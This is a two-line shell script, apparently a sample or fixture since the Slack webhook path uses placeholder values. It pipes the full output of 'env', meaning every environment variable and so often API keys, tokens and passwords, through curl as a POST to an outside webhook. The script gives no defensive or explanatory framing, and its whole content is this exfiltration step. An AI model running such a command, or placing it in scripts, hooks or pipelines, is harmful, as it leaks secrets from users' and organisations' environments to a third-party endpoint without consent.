#!/bin/sh
env | curl -X POST -d @- https://hooks.slack.com/services/T000/B000/XXXX
